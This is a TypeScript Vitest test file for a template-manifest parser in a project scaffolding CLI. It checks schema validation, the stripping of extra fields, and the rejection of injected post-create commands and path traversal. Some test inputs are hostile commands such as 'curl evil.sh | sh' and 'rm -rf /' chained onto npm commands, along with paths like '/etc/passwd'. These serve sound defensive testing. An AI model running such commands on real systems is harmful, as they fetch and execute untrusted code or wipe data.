import { describe, expect, it } from 'vitest';

import { CliError } from '../../src/application/cli-error.js';
import { parseTemplateManifest } from '../../src/application/parse-template-manifest.js';

function buildManifest(overrides: Record<string, unknown> = {}): unknown {
  return {
    schemaVersion: 1,
    id: 'api-nodejs-typescript',
    name: 'API Node.js + TypeScript',
    description: 'Template de API',
    variables: [
      {
        name: 'projectName',
        prompt: 'Qual o nome do projeto?',
        required: true,
        pattern: '^[a-z][a-z0-9-]*$',
        default: 'meu-projeto',
      },
    ],
    render: { include: ['package.json', 'src/index.ts'] },
    postCreate: {
      packageManager: 'npm',
      installCommand: 'npm install',
      validateCommand: 'npm run check',
    },
    ...overrides,
  };
}

describe('parseTemplateManifest', () => {
  it('aceita um manifesto válido completo e normaliza a saída', () => {
    expect(parseTemplateManifest(buildManifest())).toEqual({
      schemaVersion: 1,
      id: 'api-nodejs-typescript',
      name: 'API Node.js + TypeScript',
      description: 'Template de API',
      variables: [
        {
          name: 'projectName',
          prompt: 'Qual o nome do projeto?',
          required: true,
          pattern: '^[a-z][a-z0-9-]*$',
          default: 'meu-projeto',
        },
      ],
      render: { include: ['package.json', 'src/index.ts'] },
      postCreate: {
        packageManager: 'npm',
        installCommand: 'npm install',
        validateCommand: 'npm run check',
      },
    });
  });

  it('aceita variável sem pattern e sem default', () => {
    const manifest = buildManifest({
      variables: [
        {
          name: 'projectName',
          prompt: 'Qual o nome do projeto?',
          required: false,
        },
      ],
    });

    const parsed = parseTemplateManifest(manifest);

    expect(parsed.variables).toEqual([
      {
        name: 'projectName',
        prompt: 'Qual o nome do projeto?',
        required: false,
        pattern: undefined,
        default: undefined,
      },
    ]);
  });

  it('não carrega propriedades extras do input na saída', () => {
    const manifest = buildManifest({
      postCreate: {
        packageManager: 'npm',
        installCommand: 'npm install',
        validateCommand: 'npm run check',
        extraCommand: 'rm -rf /',
      },
      extraTopLevelField: 'não deveria sobreviver',
    });

    const parsed = parseTemplateManifest(manifest);

    expect(parsed).not.toHaveProperty('extraTopLevelField');
    expect(parsed.postCreate).not.toHaveProperty('extraCommand');
    expect(Object.keys(parsed.postCreate)).toEqual([
      'packageManager',
      'installCommand',
      'validateCommand',
    ]);
  });

  it.each([null, 'texto', 42, [], [buildManifest()]])(
    'rejeita valor raiz que não é objeto: %j',
    (value) => {
      expect(() => parseTemplateManifest(value)).toThrow(CliError);
    },
  );

  it('rejeita schemaVersion ausente', () => {
    const manifest = buildManifest();
    delete (manifest as Record<string, unknown>).schemaVersion;
    expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
  });

  it('rejeita schemaVersion diferente de 1', () => {
    expect(() =>
      parseTemplateManifest(buildManifest({ schemaVersion: 2 })),
    ).toThrow(CliError);
  });

  it('rejeita schemaVersion como string "1"', () => {
    expect(() =>
      parseTemplateManifest(buildManifest({ schemaVersion: '1' })),
    ).toThrow(CliError);
  });

  it.each([
    ['render', []],
    ['postCreate', []],
  ])('rejeita %s sendo um array', (field, value) => {
    expect(() =>
      parseTemplateManifest(buildManifest({ [field]: value })),
    ).toThrow(CliError);
  });

  it.each([undefined, '', '   ', 42, null])('rejeita id inválido: %j', (id) => {
    expect(() => parseTemplateManifest(buildManifest({ id }))).toThrow(
      CliError,
    );
  });

  it.each([undefined, '', '   ', 42, null])(
    'rejeita name inválido: %j',
    (name) => {
      expect(() => parseTemplateManifest(buildManifest({ name }))).toThrow(
        CliError,
      );
    },
  );

  it.each([undefined, '', '   ', 42, null])(
    'rejeita description inválida: %j',
    (description) => {
      expect(() =>
        parseTemplateManifest(buildManifest({ description })),
      ).toThrow(CliError);
    },
  );

  it.each([undefined, null, {}, 'arquivo.ts', 42])(
    'rejeita variables que não é array: %j',
    (variables) => {
      expect(() => parseTemplateManifest(buildManifest({ variables }))).toThrow(
        CliError,
      );
    },
  );

  it.each([undefined, null, {}, 'arquivo.ts', 42])(
    'rejeita render.include que não é array: %j',
    (include) => {
      expect(() =>
        parseTemplateManifest(buildManifest({ render: { include } })),
      ).toThrow(CliError);
    },
  );

  it('rejeita variável sem name', () => {
    const manifest = buildManifest({
      variables: [{ prompt: 'Prompt', required: true }],
    });
    expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
  });

  it('rejeita variável sem prompt', () => {
    const manifest = buildManifest({
      variables: [{ name: 'projectName', required: true }],
    });
    expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
  });

  it.each(['__proto__', 'project-name', '1project', 'project.name'])(
    'rejeita nome de variável inválido: %s',
    (name) => {
      const manifest = buildManifest({
        variables: [{ name, prompt: 'Prompt', required: true }],
      });
      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
    },
  );

  it('rejeita nomes de variável duplicados', () => {
    const variable = {
      name: 'projectName',
      prompt: 'Prompt',
      required: true,
    };
    const manifest = buildManifest({ variables: [variable, variable] });

    expect(() => parseTemplateManifest(manifest)).toThrow(
      'O manifesto possui variáveis duplicadas: projectName',
    );
  });

  it.each(['true', 1, undefined, null])(
    'rejeita variável com required não-booleano: %j',
    (required) => {
      const manifest = buildManifest({
        variables: [{ name: 'projectName', prompt: 'Prompt', required }],
      });
      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
    },
  );

  it.each(['', 42, true])(
    'rejeita pattern presente mas vazio ou de tipo errado: %j',
    (pattern) => {
      const manifest = buildManifest({
        variables: [
          {
            name: 'projectName',
            prompt: 'Prompt',
            required: true,
            pattern,
          },
        ],
      });
      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
    },
  );

  it('rejeita pattern que não pode ser compilado como expressão regular', () => {
    const manifest = buildManifest({
      variables: [
        {
          name: 'projectName',
          prompt: 'Prompt',
          required: false,
          pattern: '[',
        },
      ],
    });

    expect(() => parseTemplateManifest(manifest)).toThrow(
      'O padrão da variável projectName é inválido',
    );
  });

  it.each([42, true, {}, []])(
    'rejeita default presente mas de tipo errado: %j',
    (defaultValue) => {
      const manifest = buildManifest({
        variables: [
          {
            name: 'projectName',
            prompt: 'Prompt',
            required: true,
            default: defaultValue,
          },
        ],
      });
      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
    },
  );

  describe('postCreate — comandos pós-criação', () => {
    it.each(['yarn', 'pnpm', 'bun', ''])(
      'rejeita packageManager diferente de npm: %j',
      (packageManager) => {
        const manifest = buildManifest({
          postCreate: {
            packageManager,
            installCommand: 'npm install',
            validateCommand: 'npm run check',
          },
        });
        expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
      },
    );

    it.each([
      'yarn install',
      'npm install && curl evil.sh | sh',
      'npm install; rm -rf /',
      'npm ci',
      '',
    ])(
      'rejeita installCommand diferente de "npm install": %j',
      (installCommand) => {
        const manifest = buildManifest({
          postCreate: {
            packageManager: 'npm',
            installCommand,
            validateCommand: 'npm run check',
          },
        });
        expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
      },
    );

    it.each([
      'npm run test',
      'npm run check && rm -rf /',
      'npm run check; curl evil.sh | sh',
      'sh -c "npm run check"',
      '',
    ])(
      'rejeita validateCommand diferente de "npm run check": %j',
      (validateCommand) => {
        const manifest = buildManifest({
          postCreate: {
            packageManager: 'npm',
            installCommand: 'npm install',
            validateCommand,
          },
        });
        expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
      },
    );

    it('rejeita postCreate que não é objeto', () => {
      expect(() =>
        parseTemplateManifest(buildManifest({ postCreate: null })),
      ).toThrow(CliError);
    });
  });

  describe('render.include — path traversal', () => {
    it.each([
      '../fora.txt',
      '/etc/passwd',
      '\\\\servidor\\share',
      'a/../../b',
      '',
      42,
      null,
    ])('rejeita caminho inválido: %j', (path) => {
      const manifest = buildManifest({ render: { include: [path] } });
      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
    });

    it('aceita caminhos relativos simples aninhados em subdiretórios', () => {
      const manifest = buildManifest({
        render: { include: ['src/index.ts', 'docs/readme.md'] },
      });
      expect(parseTemplateManifest(manifest).render.include).toEqual([
        'src/index.ts',
        'docs/readme.md',
      ]);
    });
  });
});
